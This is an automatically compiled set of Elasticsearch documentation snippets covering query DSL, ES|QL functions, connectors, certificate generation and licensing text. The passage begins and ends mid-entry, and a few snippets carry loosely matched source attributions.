use or inability to use the\n *      Work (including but not limited to damages for loss of goodwill,\n *      work stoppage, computer failure or malfunction, or any and all\n *      other commercial damages or losses), even if such Contributor\n *      has been advised of the possibility of such damages.\n *\n *   9. Accepting Warranty or Additional Liability. While redistributing\n *      the Work or Derivative Works thereof, You may choose to offer,\n *      and charge a fee for, acceptance of support, warranty, indemnity,\n\n```\n\n----------------------------------------\n\nTITLE: Geo Bounding Box Query in Elasticsearch\nDESCRIPTION: Query to find documents with geoshapes or geopoints intersecting a specified rectangular area. Supports matching points and shapes within a defined geographical boundary.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/geo-queries.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"query\": {\n    \"geo_bounding_box\": {\n      \"location\": {\n        \"top_left\": \"40.715, -74.011\",\n        \"bottom_right\": \"40.717, -73.988\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining GraphQL Query for User Data\nDESCRIPTION: This GraphQL query example demonstrates how to fetch user data with a variable ID, which can be used in the connector's configuration.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-graphql.md#2025-04-21_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nquery getUser($id: ID!) {\n    user(id: $id) {\n        name\n        email\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Mapping GraphQL Objects to Elasticsearch IDs\nDESCRIPTION: This JSON configuration example demonstrates how to map GraphQL response objects to their corresponding ID fields for indexing in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-graphql.md#2025-04-21_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\n{\n    \"organization.users\": \"user_id\"\n}\n```\n\n----------------------------------------\n\nTITLE: List object parsing with copy support in XContentParser\nDESCRIPTION: Implementation of list object parsing that optionally creates deep copies of the list elements. This ensures immutability of the original data when transformations are applied to the parsed content.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/src/test/resources/org/elasticsearch/ingest/attachment/test/sample-files/text-empty.txt#2025-04-21_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\n@Override\npublic List<Object> list() throws IOException {\n    List<Object> list = delegate.list();\n    if (deepCopyMapAndListValues == false) {\n        return list;\n    }\n    @SuppressWarnings(\"unchecked\")\n    List<Object> copy = (List<Object>) copy(list);\n    return copy;\n}\n```\n\n----------------------------------------\n\nTITLE: Evaluating Sine Function in ESQL\nDESCRIPTION: This snippet demonstrates how to use the SIN function in ESQL to calculate the sine of an angle. It defines a row with a field 'a' and then evaluates the SIN function on 'a', storing the result in a new field named 'sin'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/sin.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL sin=SIN(a)\n```\n\n----------------------------------------\n\nTITLE: Including SIN Function Types in Markdown\nDESCRIPTION: This snippet includes the types documentation for the SIN function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/sin.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/sin.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Enabling Profile API in Elasticsearch Search Query\nDESCRIPTION: Example showing how to enable profiling for a search request by adding the 'profile' parameter set to true at the top level of the request. This example searches for 'GET /search' in the message field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"profile\": true, <1>\n  \"query\" : {\n    \"match\" : { \"message\" : \"GET /search\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Reciprocal Rank Fusion with Text Expansion in Elasticsearch\nDESCRIPTION: Example of using Reciprocal Rank Fusion (RRF) to combine results from multiple retrievers including text expansion and traditional queries. This approach provides an alternative to boolean queries for combining different search methods.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-text-expansion-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET my-index/_search\n{\n  \"retriever\": {\n    \"rrf\": {\n      \"retrievers\": [\n        {\n          \"standard\": {\n            \"query\": {\n              \"multi_match\": {\n                \"query\": \"How is the weather in Jamaica?\",\n                \"fields\": [\n                  \"title\",\n                  \"description\"\n                ]\n              }\n            }\n          }\n        },\n        {\n          \"standard\": {\n            \"query\": {\n              \"text_expansion\": {\n                \"ml.inference.title_expanded.predicted_value\": {\n                  \"model_id\": \".elser_model_2\",\n                  \"model_text\": \"How is the weather in Jamaica?\"\n                }\n              }\n            }\n          }\n        },\n        {\n          \"standard\": {\n            \"query\": {\n              \"text_expansion\": {\n                \"ml.inference.description_expanded.predicted_value\": {\n                  \"model_id\": \".elser_model_2\",\n                  \"model_text\": \"How is the weather in Jamaica?\"\n                }\n              }\n            }\n          }\n        }\n      ],\n      \"window_size\": 10,\n      \"rank_constant\": 20\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Text\nDESCRIPTION: Standard copyright and license notice text to be included in software projects using Apache License 2.0. The text includes placeholders for copyright year and owner information that should be customized.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/opencensus-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Creating a Test CA - ca1b\nDESCRIPTION: This snippet duplicates the first CA for testing purposes by creating another CA PEM named 'ca1b' with the same attributes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n# 11. Create a mimic of the first CA (\"ca1b\") for testing certificates with the same name but different keys\n\nelasticsearch-certutil ca --pem --out ${PWD}/ca1-b.zip --days 9999 --ca-dn \"CN=Test CA 1\"\nunzip ca1-b.zip\nmv ca ca1-b\n```\n\n----------------------------------------\n\nTITLE: Testing ESQL Round Function with Positive Precision\nDESCRIPTION: This snippet tests the round function with a positive precision, rounding to a specified number of decimal places.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/round.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT round(1.23, 1);\n```\n\n----------------------------------------\n\nTITLE: SQL Query for FIRST Aggregation with Two Arguments\nDESCRIPTION: This SQL query selects the first value of the keyword field, sorted by the int field, from the test table.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/sql/src/test/resources/org/elasticsearch/xpack/sql/planner/querytranslator_tests.txt#2025-04-21_snippet_28\n\nLANGUAGE: SQL\nCODE:\n```\nSELECT FIRST(keyword, int) FROM test;\n```\n\n----------------------------------------\n\nTITLE: Apache 2.0 License Boilerplate Text\nDESCRIPTION: The standard boilerplate notice text to be included in source files when applying the Apache 2.0 license. Includes placeholders for copyright year and owner that should be replaced with actual values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/cryptacular-LICENSE.txt#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Uppercase Filter using Console\nDESCRIPTION: This console request demonstrates how to employ the 'uppercase' filter with Elasticsearch's analyze API to convert the given text to uppercase, ensuring uniform text casing in queries. No additional dependencies are required for this setup. The input includes a text field with specified text, and the expected output yields tokens in uppercase form.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-uppercase-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\" : \"standard\",\n  \"filter\" : [\"uppercase\"],\n  \"text\" : \"the Quick FoX JUMPs\"\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Text Field with Custom Prefix Length Settings in Elasticsearch\nDESCRIPTION: This example demonstrates how to create a 'full_name' field with custom index_prefixes settings. It specifies min_chars as 1 and max_chars as 10, overriding the default values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/index-prefixes.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"full_name\": {\n        \"type\": \"text\",\n        \"index_prefixes\": {\n          \"min_chars\" : 1,\n          \"max_chars\" : 10\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading and Preparing Geonames Benchmark Data\nDESCRIPTION: Shell commands to download, decompress, and move the Geonames benchmark data file for use in Elasticsearch client benchmarking.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/client/benchmark/README.md#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nwget http://benchmarks.elasticsearch.org.s3.amazonaws.com/corpora/geonames/documents-2.json.bz2\nbzip2 -d documents-2.json.bz2\nmv documents-2.json client/benchmark/build\n```\n\n----------------------------------------\n\nTITLE: Logging VectorScorerFactoryTests Execution in Elasticsearch\nDESCRIPTION: This log snippet shows the execution of multiple tests in VectorScorerFactoryTests class. It includes timestamps, test names, and specific test parameters being used. The tests cover various aspects of vector scoring functionality in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_17\n\nLANGUAGE: log\nCODE:\n```\n[2024-12-23T04:52:41,744][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomSlice] Testing testRandomSliceImpl-63-30\n[2024-12-23T04:52:41,746][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomSlice] Testing testRandomSliceImpl-64-30\n[2024-12-23T04:52:41,746][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomSlice] Testing testRandomSliceImpl-65-30\n// ... (truncated for brevity)\n[2024-12-23T04:52:41,781][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomSlice] Testing testRandomSliceImpl-99-30\n[2024-12-23T04:52:41,782][INFO ][o.e.s.VectorScorerFactoryTests] [testRandomSlice] after test\n```\n\n----------------------------------------\n\nTITLE: Unicode Inc Copyright Notice for UnicodeUtil.java\nDESCRIPTION: Copyright and license notice for Unicode conversion code used in Lucene's UnicodeUtil implementation. Provides terms for usage and redistribution of Unicode Inc's code.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/analysis-nori/licenses/lucene-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n/*\n * Copyright 2001-2004 Unicode, Inc.\n * \n * Disclaimer\n * \n * This source code is provided as is by Unicode, Inc. No claims are\n * made as to fitness for any particular purpose. No warranties of any\n * kind are expressed or implied. The recipient agrees to determine\n * applicability of information provided. If this file has been\n * purchased on magnetic or optical media from Unicode, Inc., the\n * sole remedy for any claim will be exchange of defective media\n * within 90 days of receipt.\n * \n * Limitations on Rights to Redistribute This Code\n * \n * Unicode, Inc. hereby grants the right to freely use the information\n * supplied in this file in the creation of products supporting the\n * Unicode Standard, and to make copies of this file in any form\n * for internal or external distribution as long as this notice\n * remains attached.\n */\n```\n\n----------------------------------------\n\nTITLE: Log4j ParameterizedMessage Usage Restriction\nDESCRIPTION: Discourages direct usage of Log4j ParameterizedMessage, recommending java.util.Supplier<String> with String.format instead for more flexibility and control over message formatting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/es-all-signatures.txt#2025-04-21_snippet_8\n\nLANGUAGE: java\nCODE:\n```\n@defaultMessage use java.util.Supplier<String> with String.format instead of ParameterizedMessage\norg.apache.logging.log4j.message.ParameterizedMessage#<init>(java.lang.String, java.lang.String[], java.lang.Throwable)\norg.apache.logging.log4j.message.ParameterizedMessage#<init>(java.lang.String, java.lang.Object[], java.lang.Throwable)\norg.apache.logging.log4j.message.ParameterizedMessage#<init>(java.lang.String, java.lang.Object[])\norg.apache.logging.log4j.message.ParameterizedMessage#<init>(java.lang.String, java.lang.Object)\norg.apache.logging.log4j.message.ParameterizedMessage#<init>(java.lang.String, java.lang.Object, java.lang.Object)\n```\n\n----------------------------------------\n\nTITLE: Creating an HDFS Repository with Node-Specific Kerberos Principals\nDESCRIPTION: Demonstrates how to configure a secure HDFS repository with dynamic hostname-based Kerberos principals. The _HOST pattern in the principal name will be automatically replaced with the hostname of each node at runtime.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/repository-hdfs-security.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\nPUT _snapshot/my_hdfs_repository\n{\n  \"type\": \"hdfs\",\n  \"settings\": {\n    \"uri\": \"hdfs://namenode:8020/\",\n    \"path\": \"/user/elasticsearch/repositories/my_hdfs_repository\",\n    \"security.principal\": \"elasticsearch/_HOST@REALM\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Inserting a Document into Elasticsearch Index\nDESCRIPTION: This snippet shows how to insert a document with a 'content' field into the previously created Elasticsearch index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_30\n\nLANGUAGE: json\nCODE:\n```\nPUT test_index/_doc/doc1\n{\n  \"content\" : \"For you I'm only a fox like a hundred thousand other foxes. But if you tame me, we'll need each other. You'll be the only boy in the world for me. I'll be the only fox in the world for you.\"\n}\n```\n\n----------------------------------------\n\nTITLE: Input Document Example for JSON Processor with Target Field\nDESCRIPTION: Example of an input document containing a JSON string that will be processed by the JSON processor. The string_source field contains a serialized JSON object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/json-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"string_source\": \"{\\\"foo\\\": 2000}\"\n}\n```\n\n----------------------------------------\n\nTITLE: Child-most Descendant Type Representation in Painless\nDESCRIPTION: Illustrates how 'def' type values represent the child-most descendant type of any value, allowing access to specialized methods not available on parent types like Object.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-types.md#2025-04-22_snippet_6\n\nLANGUAGE: painless\nCODE:\n```\nObject l = new ArrayList(); <1>\ndef d = l;                  <2>\nd.ensureCapacity(10);       <3>\n```\n\n----------------------------------------\n\nTITLE: Indexing Document with Escaped Backslash\nDESCRIPTION: Example of indexing a document with a backslash character that needs to be escaped in the JSON string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1\n{\n  \"my_field\": \"a\\\\b\"\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Parameter Specification in Markdown\nDESCRIPTION: Documentation defining the parameters for an ESQL function. The function takes a numeric expression parameter and returns null if the parameter is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/sinh.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`number`\n:   Numeric expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules: Two Tables Query\nDESCRIPTION: Configures sync rules to fetch all records from employee and customer tables, syncing data separately to Elasticsearch\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-ms-sql.md#2025-04-21_snippet_4\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"tables\": [\n      \"employee\"\n    ],\n    \"query\": \"SELECT * FROM employee\"\n  },\n  {\n    \"tables\": [\n      \"customer\"\n    ],\n    \"query\": \"SELECT * FROM customer\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Advanced Jira Sync Rules - Status-based Filtering\nDESCRIPTION: JSON configuration for filtering Jira issues based on their status. This example shows how to target issues in specific projects with particular statuses.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-jira.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"query\": \"project = Collaboration AND status = 'In Progress'\"\n  },\n  {\n    \"query\": \"status IN ('To Do', 'In Progress', 'Closed')\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Shingle Filter and Analyzer in Elasticsearch\nDESCRIPTION: This snippet shows how to create a custom shingle filter with specific parameters and incorporate it into a new custom analyzer using the create index API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-shingle-tokenfilter.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"en\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"my_shingle_filter\" ]\n        }\n      },\n      \"filter\": {\n        \"my_shingle_filter\": {\n          \"type\": \"shingle\",\n          \"min_shingle_size\": 2,\n          \"max_shingle_size\": 5,\n          \"output_unigrams\": false\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Interval Minimization Example in Elasticsearch\nDESCRIPTION: Demonstrates the concept of interval minimization in Elasticsearch with a query searching for 'salty' contained within the phrase 'hot porridge'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-intervals-query.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nPOST _search\n{\n  \"query\": {\n    \"intervals\" : {\n      \"my_text\" : {\n        \"match\" : {\n          \"query\" : \"salty\",\n          \"filter\" : {\n            \"contained_by\" : {\n              \"match\" : {\n                \"query\" : \"hot porridge\"\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Cardinality Aggregation Query\nDESCRIPTION: Example of basic cardinality aggregation to count unique values in a field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cardinality-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"type_count\": {\n      \"cardinality\": {\n        \"field\": \"type\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL Median Function Warning Documentation\nDESCRIPTION: A warning block in markdown format explaining that the MEDIAN function is non-deterministic and can produce varying results for the same input data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/appendix/median.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n::::{warning}\n`MEDIAN` is also [non-deterministic](https://en.wikipedia.org/wiki/Nondeterministic_algorithm).\nThis means you can get slightly different results using the same data.\n::::\n```\n\n----------------------------------------\n\nTITLE: ENRICH Command with Custom Match Field in Elasticsearch SQL\nDESCRIPTION: Shows how to use a column with a different name than the match_field defined in the policy as the match field for enrichment.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-enrich-data.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nROW a = \"1\"\n| ENRICH languages_policy ON a\n```\n\n----------------------------------------\n\nTITLE: Converting Various Inputs to Boolean using TO_BOOLEAN in ESQL\nDESCRIPTION: This snippet demonstrates the usage of the TO_BOOLEAN function in ESQL. It creates a row with multiple string values and converts each to a boolean using TO_BOOLEAN. The function converts 'true' (case-insensitive) to true, '0' to false, and other non-empty strings or non-zero numbers to true.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_boolean.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW str = [\"true\", \"TRuE\", \"false\", \"\", \"yes\", \"1\"]\n| EVAL bool = TO_BOOLEAN(str)\n```\n\n----------------------------------------\n\nTITLE: Using _bucket_count Special Path in Pipeline Aggregation\nDESCRIPTION: Example showing how to use the special _bucket_count path to filter buckets based on whether they contain any buckets for an inner aggregation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/pipeline.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"histo\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"day\"\n      },\n      \"aggs\": {\n        \"categories\": {\n          \"terms\": {\n            \"field\": \"category\"\n          }\n        },\n        \"min_bucket_selector\": {\n          \"bucket_selector\": {\n            \"buckets_path\": {\n              \"count\": \"categories._bucket_count\" <1>\n            },\n            \"script\": {\n              \"source\": \"params.count != 0\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Second CA PEM - ca2 with Elasticsearch Certutil\nDESCRIPTION: This snippet creates the second CA PEM file named 'ca2' using the Elasticsearch certutil command, similar to the first CA with a validity of 9999 days.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n# 2. Create first CA PEM (\"ca2\")\nelasticsearch-certutil ca --pem --out ca2.zip --days 9999 --ca-dn \"CN=Test CA 2\"\nunzip ca2.zip \nmv ca ca2\n```\n\n----------------------------------------\n\nTITLE: Script Bundle Directory Structure Example\nDESCRIPTION: Example directory structure for a script bundle showing the placement of a JavaScript file in the scripts folder.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-custom-bundles.md#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n$ tree .\n.\n└── scripts\n    └── test.js\n```\n\n----------------------------------------\n\nTITLE: Checking Field Existence in EQL\nDESCRIPTION: Demonstrates how to check if a field exists or doesn't exist in EQL queries using comparison with null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_9\n\nLANGUAGE: eql\nCODE:\n```\n?my_field != null\n```\n\nLANGUAGE: eql\nCODE:\n```\n?my_field == null\n```\n\n----------------------------------------\n\nTITLE: Regular Expression Query with Double-Escaped Backslash\nDESCRIPTION: Example of a regexp query that matches documents containing backslashes, showing the double-escaping required in JSON.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"regexp\": {\n      \"my_field.keyword\": \"a\\\\\\\\.*\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Cosine in SQL\nDESCRIPTION: The COS function returns the cosine of a numeric expression representing an angle in radians. It takes one numeric input and outputs a double numeric value. If the input is null, the function returns null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_42\n\nLANGUAGE: sql\nCODE:\n```\nCOS(numeric_exp) <1>\n```\n\n----------------------------------------\n\nTITLE: Creating Connector API Key with Role Descriptors\nDESCRIPTION: API request to generate an API key for the Salesforce connector with specific cluster and index privileges. Requires appropriate user permissions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /_security/api_key\n{\n  \"name\": \"connector_name-connector-api-key\",\n  \"role_descriptors\": {\n    \"connector_name-connector-role\": {\n      \"cluster\": [\n        \"monitor\",\n        \"manage_connector\"\n      ],\n      \"indices\": [\n        {\n          \"names\": [\n            \"index_name\",\n            \".search-acl-filter-index_name\",\n            \".elastic-connectors*\"\n          ],\n          \"privileges\": [\n            \"all\"\n          ],\n          \"allow_restricted_indices\": false\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Google Cloud\nDESCRIPTION: Initiates the authentication process with Google Cloud. This command opens a browser window where you sign in to your Google account and authorize the Google Cloud SDK to access cloud resources.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-gce-usage-long.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\ngcloud auth login\n```\n\n----------------------------------------\n\nTITLE: Selecting Columns with KEEP Clause in ESQL\nDESCRIPTION: This ESQL query selects specific columns from the 'employees' table using the KEEP clause. It explicitly keeps the 'first_name' and 'last_name' columns, as well as any columns that start with 'first_name' using a wildcard.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/docs.csv-spec/keepCompleteName.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name, first_name*\n```\n\n----------------------------------------\n\nTITLE: Removing Allocation Filter After Node Migration\nDESCRIPTION: Elasticsearch API call to remove the allocation filter previously applied during the node migration process.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/path.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\nPUT _cluster/settings\n{\n  \"persistent\": {\n    \"cluster.routing.allocation.exclude._name\": null\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating self-signed Elasticsearch certificates\nDESCRIPTION: This script generates self-signed certificates for Elasticsearch nodes using the `elasticsearch-certutil` tool. It removes any existing certificates, creates a temporary directory, and uses the `instances.yml` configuration to generate the certificates. The generated certificates and keys are then copied to the specified test resources directory.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/readme.md#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nrm -rf /tmp/certs; mkdir /tmp/certs; rm -rf local-self\nbin/elasticsearch-certutil cert --pem --silent --in instances.yml --out /tmp/certs/self.zip --days 7300 --self-signed\nunzip /tmp/certs/self.zip -d ./local-self\ncp -r ./local-self/n*/*.crt $SOURCE_ROOT/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/self-signed\ncp -r ./local-self/n*/*.key $SOURCE_ROOT/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/self-signed\n```\n\n----------------------------------------\n\nTITLE: Using MV_PSERIES_WEIGHTED_SUM Function in ESQL\nDESCRIPTION: This example demonstrates how to use the MV_PSERIES_WEIGHTED_SUM function to calculate a weighted sum on an array using a p-series weighting factor of 1.5. The function is applied to an array of numeric values and returns a single double value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_pseries_weighted_sum.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = [70.0, 45.0, 21.0, 21.0, 21.0]\n| EVAL sum = MV_PSERIES_WEIGHTED_SUM(a, 1.5)\n| KEEP sum\n```\n\n----------------------------------------\n\nTITLE: Parameter Documentation for ESQL Log Function\nDESCRIPTION: Documents the parameters for the logarithm function in ESQL. The function accepts an optional base parameter which defaults to e for natural logarithm, and a required number parameter. Both parameters return null if given null values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/log.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`base`\n:   Base of logarithm. If `null`, the function returns `null`. If not provided, this function returns the natural logarithm (base e) of a value.\n\n`number`\n:   Numeric expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Configuring JVM Option for Active Directory Authentication Workaround in Elasticsearch 9.0.0\nDESCRIPTION: A JVM option that temporarily patches the restrictive entitlements policy for the x-pack-core module to allow LDAP library to perform outbound network connections for Active Directory authentication. This is a workaround for an issue that will be fixed in a future patch release.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/release-notes/known-issues.md#2025-04-22_snippet_0\n\nLANGUAGE: 